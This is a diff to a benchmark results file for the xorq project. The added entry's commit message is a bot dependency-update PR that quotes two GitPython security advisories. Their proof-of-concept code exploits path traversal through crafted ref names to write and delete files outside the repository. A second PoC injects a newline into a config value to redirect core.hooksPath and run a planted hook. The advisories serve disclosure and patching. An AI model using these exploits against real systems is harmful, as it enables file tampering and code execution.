@@ -1,5 +1,5 @@
 window.BENCHMARK_DATA = {
-  "lastUpdate": 1778159642243,
+  "lastUpdate": 1778159662573,
   "repoUrl": "https://github.com/xorq-labs/xorq",
   "entries": {
     "Benchmark": [
@@ -10758,6 +10758,72 @@ window.BENCHMARK_DATA = {
             "unit": "iter/sec",
             "range": "stddev: 0.023534593712684185",
             "extra": "mean: 361.35588160000225 msec\nrounds: 5"
+          }
+        ]
+      },
+      {
+        "commit": {
+          "author": {
+            "email": "29139614+renovate[bot]@users.noreply.github.com",
+            "name": "renovate[bot]",
+            "username": "renovate[bot]"
+          },
+          "committer": {
+            "email": "noreply@github.com",
+            "name": "GitHub",
+            "username": "web-flow"
+          },
+          "distinct": true,
+          "id": "95afcb6a356de8dd92135f143c93a5ec8a3023e8",
+          "message": "chore(deps): update dependency gitpython to v3.1.49 [security] (#1930)\n\nThis PR contains the following updates:\n\n| Package | Change |\n[Age](https://docs.renovatebot.com/merge-confidence/) |\n[Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n|\n[gitpython](https://redirect.github.com/gitpython-developers/GitPython)\n| `3.1.47` → `3.1.49` |\n![age](https://developer.mend.io/api/mc/badges/age/pypi/gitpython/3.1.49?slim=true)\n|\n![confidence](https://developer.mend.io/api/mc/badges/confidence/pypi/gitpython/3.1.47/3.1.49?slim=true)\n|\n\n---\n\n### GitPython reference APIs has a path traversal vulnerability that\nallows arbitrary file write and delete outside the repository\n[CVE-2026-44243](https://nvd.nist.gov/vuln/detail/CVE-2026-44243) /\n[GHSA-7545-fcxq-7j24](https://redirect.github.com/advisories/GHSA-7545-fcxq-7j24)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n##### 🧾 Summary\n\nA vulnerability in **GitPython** allows **attackers who can supply a\ncrafted reference path to an application using GitPython** to **write,\noverwrite, move, or delete files outside the repository’s `.git`\ndirectory** via **insufficient validation of reference paths in\nreference creation, rename, and delete operations**.\n\n---\n\n##### 📦 Affected Versions\n\n* Affected: `<= 3.1.46` and current `main` (`3.1.47` in local checkout)\n\n---\n\n##### 🧠 Details\n\n##### Vulnerability Type\n\n**Path Traversal leading to Arbitrary File Write and Arbitrary File\nDeletion**\n\n---\n\n##### Root Cause\n\nReference paths are validated when they are resolved for reading, but\nare not consistently validated before filesystem write, rename, and\ndelete operations.\n\n`SymbolicReference._check_ref_name_valid()` rejects traversal sequences\nsuch as `..`, but `SymbolicReference.create`, `Reference.create`,\n`SymbolicReference.set_reference`, `SymbolicReference.rename`, and\n`SymbolicReference.delete` still construct filesystem paths from\nattacker-controlled ref names without enforcing repository boundaries.\n\n---\n\n##### Affected Code\n\n```python\ndef set_reference(self, ref, logmsg=None):\n    ...\n    fpath = self.abspath\n    assure_directory_exists(fpath, is_file=True)\n\n    lfd = LockedFD(fpath)\n    fd = lfd.open(write=True, stream=True)\n    ...\n```\n\n```python\n@&#8203;classmethod\ndef delete(cls, repo, path):\n    full_ref_path = cls.to_full_path(path)\n    abs_path = os.path.join(repo.common_dir, full_ref_path)\n    if os.path.exists(abs_path):\n        os.remove(abs_path)\n```\n\n```python\ndef rename(self, new_path, force=False):\n    new_path = self.to_full_path(new_path)\n    new_abs_path = os.path.join(_git_dir(self.repo, new_path), new_path)\n    cur_abs_path = os.path.join(_git_dir(self.repo, self.path), self.path)\n    ...\n    os.rename(cur_abs_path, new_abs_path)\n```\n\n---\n\n##### Attack Vector\n\n**Local attack through application-controlled input passed into\nGitPython reference APIs**\n\n##### Authentication Required\n\n**None at the library boundary. In practice, exploitation requires the\nability to influence ref names supplied by the consuming application.**\n\n---\n\n##### 🧪 Proof of Concept\n\n##### Setup\n\n```bash\npip install GitPython==3.1.46\npython poc.py\n```\n\n---\n\n##### Exploit\n\n```python\nimport shutil\nfrom pathlib import Path\n\nfrom git import Repo\nfrom git.refs.reference import Reference\nfrom git.refs.symbolic import SymbolicReference\n\nbase = Path(\"gp-ghsa-poc\").resolve()\nif base.exists():\n    shutil.rmtree(base)\n\nrepo_dir = base / \"repo\"\nrepo = Repo.init(repo_dir)\n\n(repo_dir / \"a.txt\").write_text(\"init\\n\", encoding=\"utf-8\")\nrepo.index.add([\"a.txt\"])\nrepo.index.commit(\"init\")\n\noutside_write = base / \"outside_write.txt\"\noutside_delete = base / \"outside_delete.txt\"\noutside_delete.write_text(\"DELETE ME\\n\", encoding=\"utf-8\")\n\nprint(f\"repo_dir       = {repo_dir}\")\nprint(f\"outside_write  = {outside_write}\")\nprint(f\"outside_delete = {outside_delete}\")\n\nReference.create(repo, \"../../../outside_write.txt\", \"HEAD\")\n\nprint(\"\\n[+] outside_write exists:\", outside_write.exists())\nif outside_write.exists():\n    print(\"[+] outside_write content:\")\n    print(outside_write.read_text(encoding=\"utf-8\"))\n\nSymbolicReference.delete(repo, \"../../../outside_delete.txt\")\n\nprint(\"\\n[+] outside_delete exists after delete:\", outside_delete.exists())\n```\n\n---\n\n##### Result\n\n```text\nrepo_dir       = ...\\gp-ghsa-poc\\repo\noutside_write  = ...\\gp-ghsa-poc\\outside_write.txt\noutside_delete = ...\\gp-ghsa-poc\\outside_delete.txt\n\n[+] outside_write exists: True\n[+] outside_write content:\n<current HEAD commit SHA>\n\n[+] outside_delete exists after delete: False\n```\n\n---\n\n##### 💥 Impact\n\n##### What can an attacker do?\n\n* Create or overwrite files outside the repository metadata directory\n* Delete attacker-chosen files reachable from the process permissions\n* Corrupt application state or configuration files\n* Cause denial of service by deleting or overwriting important files\n\n---\n\n##### Security Impact\n\n* **Confidentiality:** Low\n* **Integrity:** High\n* **Availability:** High\n\n---\n\n##### Who is affected?\n\n* Applications that expose GitPython reference operations to\nuser-controlled input\n* Git automation services, repository management backends, CI/CD\nhelpers, and developer platforms\n* Multi-user environments where one user can influence ref names\nprocessed on behalf of another workflow\n\n---\n\n##### 🛠️ Mitigation / Fix\n\n##### Recommended Fix\n\n```python\ndef _validate_ref_write_path(repo, path, *, for_git_dir=False):\n    SymbolicReference._check_ref_name_valid(path)\n\n    base = Path(repo.git_dir if for_git_dir else repo.common_dir).resolve()\n    target = (base / path).resolve()\n\n    if base not in [target, *target.parents]:\n        raise ValueError(f\"Reference path escapes repository boundary: {path}\")\n\n    return str(target)\n```\n\n```python\nfull_ref_path = cls.to_full_path(path)\n_validate_ref_write_path(repo, full_ref_path)\n```\n\n#### Severity\n- CVSS Score: 7.8 / 10 (High)\n- Vector String:\n`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P`\n\n#### References\n-\n[https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24](https://redirect.github.com/gitpython-developers/GitPython/security/advisories/GHSA-7545-fcxq-7j24)\n-\n[https://github.com/advisories/GHSA-7545-fcxq-7j24](https://redirect.github.com/advisories/GHSA-7545-fcxq-7j24)\n\nThis data is provided by the [GitHub Advisory\nDatabase](https://redirect.github.com/advisories/GHSA-7545-fcxq-7j24)\n([CC-BY\n4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n### GitPython: Newline injection in config_writer().set_value() enables\nRCE via core.hooksPath\n[CVE-2026-44244](https://nvd.nist.gov/vuln/detail/CVE-2026-44244) /\n[GHSA-v87r-6q3f-2j67](https://redirect.github.com/advisories/GHSA-v87r-6q3f-2j67)\n\n<details>\n<summary>More information</summary>\n\n#### Details\n`GitConfigParser.set_value()` passes values to Python's `configparser`\nwithout validating for newlines. GitPython's own `_write()` converts\nembedded newlines into indented continuation lines (e.g. `\\n` becomes\n`\\n\\t`), but Git still accepts an indented `[core]` stanza as a section\nheader — so the injected `core.hooksPath` becomes effective\nconfiguration. Any Git operation that invokes hooks (commit, merge,\ncheckout) will then execute scripts from the attacker-controlled path.\n\nThe vulnerability is not merely malformed config output: GitPython's own\nwriter converts embedded newlines into indented continuation lines, but\nGit still accepts an indented `[core]` stanza as a section header, so\nthe injected `core.hooksPath` becomes effective configuration.\n\nThis was found while auditing MLRun's `project.push()` method, which\npasses `author_name` and `author_email` directly to\n`config_writer().set_value()` with no sanitization. Both parameters\ncross a trust boundary — they are caller-supplied API inputs that end up\nin `.git/config`.\n\nPoC (standalone, no MLRun required):\n\n```python\nimport git, subprocess, os\n\nrepo = git.Repo(\"/tmp/testrepo\")\n\nwith repo.config_writer() as cw:\n    cw.set_value(\"user\", \"name\", \"foo\\n[core]\\nhooksPath=/tmp/hooks\")\n\nr = subprocess.run([\"git\", \"config\", \"core.hooksPath\"], cwd=\"/tmp/testrepo\", capture_output=True, text=True)\nassert r.returncode == 0\nprint(r.stdout.strip())  # /tmp/hooks\n\nos.makedirs(\"/tmp/hooks\", exist_ok=True)\nopen(\"/tmp/hooks/pre-commit\", \"w\").write(\"#!/bin/sh\\nid > /tmp/pwned\\n\")\nos.chmod(\"/tmp/hooks/pre-commit\", 0o755)\n\nrepo.index.add([\"README\"])\nrepo.git.commit(m=\"test\")\nprint(open(\"/tmp/pwned\").read())  # uid=...\n```\n\nTested on GitPython 3.1.46, git 2.39+.\n\nImpact: This is persistent repo config poisoning. Any user who can\nsupply `author_name` or `author_email` to an application calling\n`config_writer().set_value()` can redirect Git hook execution to an\narbitrary path. In a multi-user or hosted environment (e.g. a shared\nMLRun server where multiple users push to the same repositories), one\nuser can poison the `.git/config` of a shared repo and have their hooks\nrun in the context of every subsequent Git operation by any user. On\nsingle-user deployments, the impact depends on whether the application\nlater invokes Git hooks automatically.\n\nRemediation: `set_value()` should raise on CR, LF, or NUL in values\nrather than silently pass them through:\n\n```python\nimport re\n\nif isinstance(value, (str, bytes)) and re.search(r\"[\\r\\n\\x00]\", str(value)):\n    raise ValueError(\"Git config values must not contain CR, LF, or NUL\")\n```\n\nRejecting is safer than stripping — a stripped newline might indicate\nthe caller is passing unsanitized input at a higher level, and silent\nnormalization masks that.\n\nAffected wherever `config_writer().set_value(section, key, user_input)`\nis called with external input.** GitPython is a dependency of DVC,\nMLflow, Kedro, and others — worth auditing their `set_value()` call\nsites for externally influenced inputs.\n\n#### Severity\n- CVSS Score: 7.8 / 10 (High)\n- Vector String: `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`\n\n#### References\n-\n[https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-v87r-6q3f-2j67](https://redirect.github.com/gitpython-developers/GitPython/security/advisories/GHSA-v87r-6q3f-2j67)\n-\n[https://github.com/advisories/GHSA-v87r-6q3f-2j67](https://redirect.github.com/advisories/GHSA-v87r-6q3f-2j67)\n\nThis data is provided by the [GitHub Advisory\nDatabase](https://redirect.github.com/advisories/GHSA-v87r-6q3f-2j67)\n([CC-BY\n4.0](https://redirect.github.com/github/advisory-database/blob/main/LICENSE.md)).\n</details>\n\n---\n\n- [ ] <!-- rebase-check -->If you want to rebase/retry this PR, check\nthis box\n\n<!--renovate-debug:eyJjcmVhdGVkSW5WZXIiOiI0My4xNTkuMiIsInVwZGF0ZWRJblZlciI6IjQzLjE1OS4yIiwidGFyZ2V0QnJhbmNoIjoibWFpbiIsImxhYmVscyI6W119-->\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
+          "timestamp": "2026-05-07T15:10:17+02:00",
+          "tree_id": "c99ea94d4670f1d3fd3d18048478abb5ce1387be",
+          "url": "https://github.com/xorq-labs/xorq/commit/95afcb6a356de8dd92135f143c93a5ec8a3023e8"
+        },
+        "date": 1778159659620,
+        "tool": "pytest",
+        "benches": [
+          {
+            "name": "python/xorq/catalog/tests/test_benchmark_cli.py::test_benchmark_catalog_help",
+            "value": 7.824164829512447,
+            "unit": "iter/sec",
+            "range": "stddev: 0.017687794070026127",
+            "extra": "mean: 127.80916836363654 msec\nrounds: 11"
+          },
+          {
+            "name": "python/xorq/catalog/tests/test_benchmark_cli.py::test_benchmark_catalog_init",
+            "value": 2.6548193420816912,
+            "unit": "iter/sec",
+            "range": "stddev: 0.07942488770628887",
+            "extra": "mean: 376.6734648000124 msec\nrounds: 5"
+          },
+          {
+            "name": "python/xorq/catalog/tests/test_benchmark_cli.py::test_benchmark_catalog_add",
+            "value": 0.682791642145352,
+            "unit": "iter/sec",
+            "range": "stddev: 0.16603317461861175",
+            "extra": "mean: 1.4645756308000046 sec\nrounds: 5"
+          },
+          {
+            "name": "python/xorq/catalog/tests/test_benchmark_cli.py::test_benchmark_catalog_list",
+            "value": 3.049367513363517,
+            "unit": "iter/sec",
+            "range": "stddev: 0.01864265161566872",
+            "extra": "mean: 327.9368576000138 msec\nrounds: 5"
+          },
+          {
+            "name": "python/xorq/catalog/tests/test_benchmark_cli.py::test_benchmark_catalog_info",
+            "value": 3.0384042280574666,
+            "unit": "iter/sec",
+            "range": "stddev: 0.014686601916441515",
+            "extra": "mean: 329.1201318000162 msec\nrounds: 5"
+          },
+          {
+            "name": "python/xorq/catalog/tests/test_benchmark_cli.py::test_benchmark_catalog_check",
+            "value": 2.974284989889168,
+            "unit": "iter/sec",
+            "range": "stddev: 0.022935774988566374",
+            "extra": "mean: 336.2152596000101 msec\nrounds: 5"
           }
         ]
       }
